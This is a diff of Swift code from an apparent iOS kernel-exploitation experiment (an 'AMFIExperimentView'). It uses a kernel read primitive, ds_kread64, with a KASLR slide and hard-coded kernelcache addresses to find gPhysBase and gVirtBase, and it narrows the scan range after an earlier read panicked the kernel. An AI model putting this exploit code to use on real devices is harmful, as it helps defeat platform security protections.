@@ -3165,12 +3165,12 @@ struct AMFIExperimentView: View {
         // gPhysBase/gVirtBase should be in same __DATA segment
         // From kernelcache analysis: potential pair at 0xfffffff00a0f4858
         
-        let candidateAddr = UInt64(0xfffffff00a0f4858) + slide
-        let val1 = ds_kread64(candidateAddr)
-        let val2 = ds_kread64(candidateAddr + 8)
-        detail += "Candidate gPhysBase area (0xfffffff00a0f4858+slide):\n"
-        detail += "  val1: 0x\(String(format: "%llx", val1))\n"
-        detail += "  val2: 0x\(String(format: "%llx", val2))\n"
+        // Try reading from candidate address (close to pmap_cs = safe)
+        // 0xfffffff00a0f4858 is too far (~64KB) — SKIP (caused panic before)
+        // Instead just scan the safe +-256 byte zone
+        let val1: UInt64 = 0
+        let val2: UInt64 = 0
+        detail += "Skipping far candidate (panic risk). Using safe scan only.\n"
         
         // Check if these look like phys/virt base
         var gPhysBase: UInt64 = 0
@@ -3193,23 +3193,23 @@ struct AMFIExperimentView: View {
             detail += "  → gVirtBase = 0x\(String(format: "%llx", val2))!\n"
         }
         
-        // If not found at candidate, scan nearby
+        // If not found at candidate, scan nearby (VERY SMALL range — safe zone only!)
         if gPhysBase == 0 || gVirtBase == 0 {
-            detail += "\nScanning __DATA for gPhysBase/gVirtBase...\n"
+            detail += "\nScanning +-256 bytes from pmap_cs (safe zone only)...\n"
             let pmapCS = UInt64(0xfffffff00a0e45b8) + slide
             
-            // Scan in 8-byte steps around pmap_cs (safe zone)
-            for offset in stride(from: Int64(-0x2000), through: Int64(0x10000), by: 8) {
+            // Only scan very close to pmap_cs (proven safe in exp 69)
+            for offset in stride(from: Int64(-256), through: Int64(256), by: 8) {
                 let addr = UInt64(Int64(pmapCS) + offset)
                 let val = ds_kread64(addr)
                 
                 if gPhysBase == 0 && val >= 0x800000000 && val <= 0x900000000 {
                     gPhysBase = val
-                    detail += "  Found gPhysBase=0x\(String(format: "%llx", val)) at offset \(offset)\n"
+                    detail += "  Found gPhysBase=0x\(String(format: "%llx", val)) at pmap_cs\(offset >= 0 ? "+" : "")\(offset)\n"
                 }
                 if gVirtBase == 0 && (val & 0xFFFFFFF000000000) == 0xFFFFFFF000000000 && val != 0xFFFFFFFFFFFFFFFF {
                     gVirtBase = val
-                    detail += "  Found gVirtBase=0x\(String(format: "%llx", val)) at offset \(offset)\n"
+                    detail += "  Found gVirtBase=0x\(String(format: "%llx", val)) at pmap_cs\(offset >= 0 ? "+" : "")\(offset)\n"
                 }
                 
                 if gPhysBase != 0 && gVirtBase != 0 { break }
